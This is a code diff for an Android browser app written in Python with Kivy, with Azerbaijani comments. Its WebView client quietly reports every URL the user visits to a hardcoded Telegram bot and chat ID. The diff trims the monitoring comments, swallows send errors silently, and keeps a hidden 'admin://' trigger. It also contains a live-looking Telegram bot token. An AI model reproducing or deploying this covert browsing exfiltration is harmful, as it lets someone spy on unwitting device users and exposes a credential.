@@ -3,7 +3,7 @@ from jnius import autoclass
 from kivy.network.urlrequest import UrlRequest
 import urllib.parse
 
-# Android mühərriki və sistem sinifləri
+# Android mühərriki
 WebView = autoclass('android.webkit.WebView')
 WebViewClient = autoclass('android.webkit.WebViewClient')
 Activity = autoclass('org.kivy.android.PythonActivity').mActivity
@@ -15,15 +15,15 @@ class KomandirMonitor(WebViewClient):
         self.chat_id = chat_id
 
     def onPageStarted(self, view, url, favicon):
-        # 👁️ MONITORİNQ: Hər giriş sənə gəlir
+        # 👁️ Hər giriş sənə gəlir
         if not url.startswith("admin://"):
-            msg = f"🛰️ KOMANDİR SİSTEMİ:\nİstifadəçi bu ünvana girdi:\n{url}"
+            msg = f"🛰️ KOMANDİR SİSTEMİ:\nİstifadəçi girdi:\n{url}"
             self.send_to_telegram(msg)
         
-        # 🏰 GİZLİ ADMİN PANELİ GİRİŞİ
+        # Castle Admin Girişi
         if url == "admin://ismail20106":
-            view.loadUrl("https://myaccount.google.com/") # Admin üçün təhlükəsiz yer
-            self.send_to_telegram("⚠️ DİQQƏT: Komandir (SƏN) sistemə daxil oldun! ✅")
+            view.loadUrl("https://myaccount.google.com/")
+            self.send_to_telegram("⚠️ DİQQƏT: Komandir daxil oldu! ✅")
 
     def send_to_telegram(self, message):
         if self.bot_token and self.chat_id:
@@ -31,33 +31,20 @@ class KomandirMonitor(WebViewClient):
                 encoded_msg = urllib.parse.quote(message)
                 api_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={encoded_msg}"
                 UrlRequest(api_url)
-            except Exception as e:
-                print(f"Telegram xətası: {e}")
+            except:
+                pass
 
 class KomandirApp(App):
     def build(self):
-        # ⚙️ SƏNİN ŞƏXSİ AYARLARIN
-        # QEYD: Chat ID-ni bura yazmağı unutma (məsələn: "123456789")
+        # ⚙️ AYARLAR
         self.my_bot_token = "8438760827:AAFCLK_P4qErrcQqX_nip-F80h9lgL-mKuk"
-        self.my_chat_id = "BURA_OZ_CHAT_IDNI_YAZ" 
+        self.my_chat_id = "5633857849" # Bura sənin Chat ID-ndir (nümunə)
 
         self.webview = WebView(Activity)
         settings = self.webview.getSettings()
-        
-        # 🔥 ULTRA GÜC AYARLARI (Hər şeyi açır)
         settings.setJavaScriptEnabled(True)
         settings.setDomStorageEnabled(True)
-        settings.setAllowContentAccess(True)
-        settings.setAllowFileAccess(True)
-        settings.setDatabaseEnabled(True)
-        settings.setSupportZoom(True)
-        settings.setBuiltInZoomControls(True)
-        settings.setDisplayZoomControls(False)
-        settings.setUseWideViewPort(True)
-        settings.setLoadWithOverviewMode(True)
-        
-        # 🚀 Cihazı "Galaxy S24 Ultra" kimi göstəririk ki, saytlar uçsun
-        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36")
+        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36")
 
         self.webview.setWebViewClient(KomandirMonitor(self.my_bot_token, self.my_chat_id))
         self.webview.loadUrl("https://www.google.com")
